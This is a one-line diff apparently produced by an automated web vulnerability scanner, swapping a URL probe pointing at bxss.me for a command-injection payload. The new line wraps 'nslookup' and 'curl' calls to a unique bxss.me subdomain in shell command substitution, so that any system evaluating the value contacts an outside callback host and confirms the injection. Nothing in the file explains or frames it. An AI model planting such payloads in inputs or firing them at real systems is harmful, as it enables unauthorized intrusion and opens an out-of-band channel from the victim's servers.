@@ -1,1 +1,1 @@
-http://bxss.me/t/fit.txt?.jpg
+$(nslookup -q=cname hitqjiwcydjaaac007.bxss.me||curl hitqjiwcydjaaac007.bxss.me)
